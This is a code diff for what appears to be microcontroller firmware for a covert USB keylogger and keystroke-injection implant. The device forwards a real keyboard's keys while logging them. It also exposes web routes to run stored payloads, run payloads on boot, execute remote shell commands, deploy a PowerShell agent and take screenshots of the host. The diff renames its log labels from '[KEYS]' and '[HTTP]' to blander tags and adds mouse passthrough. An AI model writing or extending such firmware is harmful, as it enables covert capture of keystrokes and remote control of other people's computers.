@@ -30,12 +30,12 @@ void writeBufferedKey(char key) {
         display.setCursor(0, 0);
         display.display();
         hasClearedStartup = true;
-        printout("[KEYS] ");
+        printout("[LOG] ");
     }
     if (lastPrintWasRoute) {
         printout("\n");
         lastPrintWasRoute = false;
-        printout("[KEYS] ");
+        printout("[LOG] ");
     }    
     char str[2] = { key, '\0' };
     printout(str);
@@ -106,7 +106,6 @@ void formatFS() {
 void setup() {
     Serial.begin(115200);
     LittleFS.begin();
-    Keyboard.begin();
     delay(1000);
     checkBootPayloads();   
     loadWiFiSettings();
@@ -122,29 +121,29 @@ void setup() {
     LittleFS.mkdir("/payloads");
     server.on("/payloads", HTTP_GET, handlePayloadsPage);
     server.on("/list_payloads", HTTP_GET, listPayloads);
-    routeWithLog("/save_payload", HTTP_POST, savePayload, "[HTTP] Payload Saved");
-    routeWithLog("/delete_payload", HTTP_POST, deletePayload, "[HTTP] Payload Deleted");
+    routeWithLog("/save_payload", HTTP_POST, savePayload, "[SVR] Payload Saved");
+    routeWithLog("/delete_payload", HTTP_POST, deletePayload, "[SVR] Payload Deleted");
     server.on("/get-payload", HTTP_GET, handleGetPayload);
-    routeWithLog("/run_payload", HTTP_POST, runPayload, "[HTTP] Running Payload");
+    routeWithLog("/run_payload", HTTP_POST, runPayload, "[SVR] Running Payload");
     server.on("/", HTTP_GET, handleRoot);  
-    routeWithLog("/clear", HTTP_POST, handleClearLogs, "[HTTP] Logs Cleared");
-    routeWithLog("/toggle_payload_boot", HTTP_POST, handleTogglePayloadOnBoot, "[HTTP] POB Toggled");
+    routeWithLog("/clear", HTTP_POST, handleClearLogs, "[SVR] Logs Cleared");
+    routeWithLog("/toggle_payload_boot", HTTP_POST, handleTogglePayloadOnBoot, "[SVR] POB Toggled");
     server.on("/list_boot_payloads", HTTP_GET, handleListBootPayloads);
     server.on("/settings", HTTP_GET, handleSettingsPage);
-    routeWithLog("/save_settings", HTTP_POST, handleSaveSettings, "[HTTP] Settings Saved");
+    routeWithLog("/save_settings", HTTP_POST, handleSaveSettings, "[SVR] Settings Saved");
     server.on("/load_settings", HTTP_GET, handleLoadSettings);
-    routeWithLog("/format_littlefs", HTTP_POST, handleFormatLittleFS, "[HTTP] FS Formatted");
+    routeWithLog("/format_littlefs", HTTP_POST, handleFormatLittleFS, "[SVR] FS Formatted");
     server.on("/keyboard", HTTP_GET, handleKeyboardPage);
     server.on("/keypress", HTTP_POST, handleKeyPress);
     server.on("/shell", HTTP_GET, handleShell);
-    routeWithLog("/execute", HTTP_POST, handleExecuteCommand, "[HTTP] Command Executed");
-    routeWithLog("/deploy", HTTP_POST, handlePsAgent, "[HTTP] PS Agent Started");
+    routeWithLog("/execute", HTTP_POST, handleExecuteCommand, "[SVR] Command Executed");
+    routeWithLog("/deploy", HTTP_POST, handlePsAgent, "[SVR] PS Agent Started");
     server.on("/screen", HTTP_GET, handleScreenPage);
-    routeWithLog("/take-screenshot", HTTP_POST, handleTakeScreenshot, "[HTTP] Taking Screenshot");
+    routeWithLog("/take-screenshot", HTTP_POST, handleTakeScreenshot, "[SVR] Screenshot");
     server.on("/get-screenshot", HTTP_GET, handleGetScreenshot);
-    routeWithLog("/deploy-screenshot", HTTP_POST, handleSSAgent, "[HTTP] SS Agent Started");
+    routeWithLog("/deploy-screenshot", HTTP_POST, handleSSAgent, "[SVR] SS Agent Started");
     server.on("/screenshot.jpg", HTTP_GET, handleSavedScreenshot);
-    routeWithLog("/exit-agent", HTTP_POST, handleExitAgent, "[HTTP] Exiting Agent");
+    routeWithLog("/exit-agent", HTTP_POST, handleExitAgent, "[SVR] Exiting Agent");
 
     server.begin();
     Serial.println("HTTP Server Started.");
@@ -186,8 +185,9 @@ void loop() {
     readSerialScreenshot();
 }
 
-void setup1() { 
-    Serial.println("Core1 setup to run TinyUSB host with pio-usb");
+void setup1() {
+    Keyboard.begin();
+    Mouse.begin();  
     uint32_t cpu_hz = clock_get_hz(clk_sys);
     if ( cpu_hz != 120000000UL && cpu_hz != 240000000UL ) {
       Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
@@ -226,16 +226,43 @@ void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report,
 }
 
 void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
-    static bool reportPending = false;
+    static bool reportPending = false; 
     if (!reportPending) {
         uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);
         if (itf_protocol == HID_ITF_PROTOCOL_KEYBOARD) {
             process_boot_kbd_report((hid_keyboard_report_t const*)report);
-        }        
+        }
+        if (itf_protocol == HID_ITF_PROTOCOL_MOUSE) {
+            process_boot_mouse_report( (hid_mouse_report_t const*) report );
+        }      
         reportPending = true;
         tuh_hid_receive_report(dev_addr, idx);
         reportPending = false;
     }
+}
+
+void process_boot_mouse_report(hid_mouse_report_t const * report) { 
+  hid_mouse_report_t prev_report = { 0 };
+  uint8_t button_changed_mask = report->buttons ^ prev_report.buttons;
+  if ( button_changed_mask & report->buttons) {
+    if(report->buttons & MOUSE_BUTTON_LEFT) {
+      Mouse.press(MOUSE_LEFT);
+      delay(100);
+      Mouse.release(MOUSE_ALL);
+    }
+    else if(report->buttons & MOUSE_BUTTON_RIGHT) {
+      Mouse.press(MOUSE_RIGHT); 
+      delay(100);
+      Mouse.release(MOUSE_ALL);
+    }
+    else if(report->buttons & MOUSE_BUTTON_MIDDLE) {
+      Mouse.press(MOUSE_MIDDLE);
+      delay(100);
+      Mouse.release(MOUSE_ALL);
+    }
+  } 
+  int8_t x; int8_t y; int8_t wheel;
+  Mouse.move(report->x, report->y, report->wheel);
 }
 
 void SetModifiersArd(void) {
